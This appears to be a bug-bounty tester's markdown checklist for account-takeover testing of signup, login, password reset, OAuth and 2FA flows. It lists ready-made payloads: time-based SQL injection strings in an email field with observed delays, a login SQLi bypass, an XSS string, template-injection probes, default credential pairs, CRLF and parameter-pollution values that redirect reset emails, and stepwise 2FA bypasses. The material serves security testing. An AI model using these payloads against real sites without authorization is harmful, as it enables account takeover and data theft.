<details> 
## <summary>signup vulnerabilities</summary>
    
    0- check in login page or register page http or https 
    (insecure data transfer ) 
    	-------------------------------------------------------------
    1- if there is no verification code or confirmation then 
    signup with admin@~~site.com~~ and report pre-account takeover vulnerability 
	-------------------------------------------------------------
   
    3- while registertion put xss payloads inside username , name ....
        -------------------------------------------------------------
    
        -------------------------------------------------------------

    7- SQLI in Email Field

	{"email":"asd'a@a.com"} --> Not Valid
	{"email":"asd'or'1'='1@a.com" }  --> valid
	{"email":"a'-IF(LENGTH(database())>9,SLEE P(7),0)or'1'='1@a.com"} --> Not Valid
	{"email":"a'-IF(LENGTH(database())>9,SLEE P(7),0)or'1'='1@a.com"}  -> Valid -->  Delay: 7,854 milis
	{"email":"\\"a'-IF(LENGTH(database())=10,SLEEP(7),0)or'1'='1\\"@a.com"} --> {"code":0,"status":200,"mes sage":"Berhasil"} --> Valid --> Delay 8,696 milis
	{"email":"\\"a"-IF(LENGTH(database())=11,SLEEP(7),0)or'1'='1\\"@a.com"} ---> {"code":0,"status":200,"mes sage":"Berhasil"} ---> Valid --> No delay
	-------------------------------------------------------------
	- Try OAuth login with the same email account twice
 	- one from google and the other from the deafault signup function
  	- Business logic error
	-------------------------------------------------------------
 	1. Create an account with a non-existing phone number
	2. Intercept the Request in BurpSuite
	3. Send the request to the repeater and forward
	4. Go to Repeater tab and change the non-existent phone number to your phone number
	5. If you got an OTP to your phone, try using that OTP to register that non-existent number 
	-------------------------------------------------------------
	- Manipulate the JSON request
 		{
	        "code":[
	                "1000",
	                "1001",
	                "1002",
	                ...
	                "9999"
	                ]
		}

	-------------------------------------------------------------

      
</details>

-----------------------------------------------------------------------------


<details>
## <summary>login vulnerabilities </summary>

	 1- login over http not https 	( insecure data transfer )
	
	 3- try default credentials (test:test) (admin:admin) (admin:password) (kali:kali) (admin:123)
	  (admin:default) (root:root) (root:toor) (admin:kali) (kali:root) (admin:123456789)
	
	 4- try to inject sql injection in username as admin' or 1=1; -- -
	
	 5- try to make response manipulation  to bypass login page
	
	 6- use the request and send it to sqlmap to test if there is sql injection or not
	
	 7- try to inject xss payloads in username as <svg/onload=confirm()>
	
	 8- try to inject template injection inside username as {{9*9}} and if printed 81 then vulnerable to template injection
	
	 9- view source code of the page from CTRL+U to see if leaked credentials

 </details>

-----------------------------------------------------------------------------



  <details>
## <summary>reset password vulnerabilities</summary>
    
    check link of reset password in email if http not https
    check reset request code can be leaked in request or response
    no rate limit (Email bombing)
    --------------------------------------
     brute force otp 
    --------------------------------------
	- check if the password reset endpoint is vulnerable to IDOR
	-  check if the password reset endpoint is vulnerable to Host Header injection
 	- test for HTTP parameter Pollution (HPP)
    --------------------------------------
	- Test for SQLI in the reset pass send function
    --------------------------------------
	- Check for weak Cryptography in Password Reset 
	--------------------------------------
	# parameter pollution
	email=victim@mail.com&email=hacker@mail.com
	
	# array of emails
	{"email":["victim@mail.com","hacker@mail.com"]}
	
	# carbon copy
	email=victim@mail.com%0A%0Dcc:hacker@mail.com
	email=victim@mail.com%0A%0Dbcc:hacker@mail.com
	
	# separator
	email=victim@mail.com,hacker@mail.com
	email=victim@mail.com%20hacker@mail.com
	email=victim@mail.com|hacker@mail.com
 	email="victim@mail.tld%0a%0dbcc:attacker@mail.tld"
	#No domain:
	email=victim
	#No TLD (Top Level Domain):
	email=victim@xyz
	#change param case 
	email=victim@mail.com&Email=attacker@mail.com
	email@email.com**,**victim@hack.secry  
	email@email**“,”**victim@hack.secry  
	email@email.com**:**victim@hack.secry  
	email@email.com**%0d%0a**victim@hack.secry  
	**%0d%0a**victim@hack.secry  
	**%0a**victim@hack.secry  
	victim@hack.secry**%0d%0a**  
	victim@hack.secry**%0a**  
	victim@hack.secry**%0d**  
	victim@hack.secry**%00**  
	victim@hack.secry**{{}}**
	--------------------------------------
	- Ask for reset password and visit the link sent to your email
	- Click on any social media icon on the page & intercept the request
 	- lock if the token link in the refere header or the request
  	- Paswword reset link leak via referrer
    	It allows the person who has control of site to change the user’s password (CSRF attack), because this person knows reset password token of the user.
	--------------------------------------
 	- Login to your account and change pass then intercept the request
  	- in Repeater enter another email and change their password 
	--------------------------------------
	- Use Burp Sequencer to find the randomness or predictability of tokens.
	- Check if it:
 		| Generated based Timestamp
		| Generated based on the UserID
		| Generated based on email of User
		| Generated based on Firstname and Lastname
		| Generated based on Date of Birth
		| Generated based on Cryptography
	--------------------------------------

</details>

-----------------------------------------------------------------------------

<details>
	<summary>OAuth</summary>

	- Look in JS files or Github Repo for client_id & client_secret
 	- Mainpulate the redirect_uri & client_id 
  		- The Auth Server may not check those two with the ones in the DB

	----------------------------------------------------------------------------------------
 	1- Create account victim@gmail.com
  	2- Login form google also using victim@gmail.com
   	3- notice it didn't check if user exist or not
	----------------------------------------------------------------------------------------
 	1- Create account with facebook
  	2- remove email and try put the user email

    
    
  
</details>


-----------------------------------------------------------------------------

<details>
	<summary>2FA</summary>

	- Request a 2FA code from Attacker Account.
	- Use this valid 2FA code in the victim 2FA  Request and see if it bypass the 2FA Protection.
	 ----------------------------------------------------
 	- Try Response & Status code manipulation 
  	- if "Success":"false" Change it to true
   	- if the response 4xx change it to 200 OK
	----------------------------------------------------
 	- CSRF on 2FA disable feature
  	----------------------------------------------------
	- The 2FA code maybe leaked in the response or request
 	----------------------------------------------------
  	- while triggering the 2FA Code Request, 
		Analyze all the JS Files that are referred in the Response 
		to see if any JS file contain information that can help bypass 2FA code.
	----------------------------------------------------
	TOKEN
 		- try reuse used token
   		- use token to bypass another account
     		- Check for Leaked token
       	----------------------------------------------------
	1. As a user1, register, skip 2FA, copy the ID.
	2. Register an account user2, register, perform a 2FA request but with ID from user1.
	3. 2FA is enabled now on the account user1!
	4. Perform a request /api/2fa/verify with valid code and ID of user1.
	
	<https://hackerone.com/reports/810880>
	----------------------------------------------------
	1. Try Login to your account
	2. In 2FA Request resend the code
	3. If the old and new code is the same then there is an issue
	Impact: code that is not updated after a request new one makes it easier for a hacker to brute force or guess the code
	
	<https://github.com/bugcrowd/vulnerability-rating-taxonomy/issues/289>
    	----------------------------------------------------
	- Bypass 2FA with null or 000000 or Blanc
 	----------------------------------------------------
  	1. Using the same session start the flow using your account and the victim's account.
	2. When reaching the 2FA point on both accounts.
	3. complete the 2FA with your account but do not access the next part.
	4. Instead of that, try to access the next step with the victim's account flow.
	5. If the back-end only set a Boolean inside your sessions saying that you have successfully passed the 2FA you will be able to bypass the 2FA of the victim.
 	----------------------------------------------------
  	1. Use burp suite or another tool to intercept the requests
	2. Turn on and configure your MFA
	3. Login with your email and password
	4. The page of MFA is going to appear
	5. Enter any random number
	6. when you press the button "sign in securely" intercept the request POST auth.target.com/v3/api/login and in the POST message change the fields: "mode":"sms" by "mode":"email" "secureLogin":true by "secureLogin":false
	send the modification and check, you are in your account! It was not necessary to enter the phone code.
	
	<https://hackerone.com/reports/665722>
	----------------------------------------------------
	enter 2 wrong attempts in a short time
	this may leads to bypass the 2FA process
	
	<https://hackerone.com/reports/1747978>
	----------------------------------------------------
	
	- Remove the part of the cookie that is responsible for 2FA authentication
	
	https://hackerone.com/reports/2315420
	----------------------------------------------------
  	- 








 
</details>

-----------------------------------------------------------------------------

#### Random 
```
- CORS Misconfiguration to Account Takeover

- HTTP Request Smuggling to ATO
	https://hackerone.com/reports/737140
	https://hackerone.com/reports/740037

- in Profile section look for CSRF, CORS, Cache Deception, IDOR and many more

-Top ATO report in hackerone
	https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPACCOUNTTAKEOVER.md

- 
```
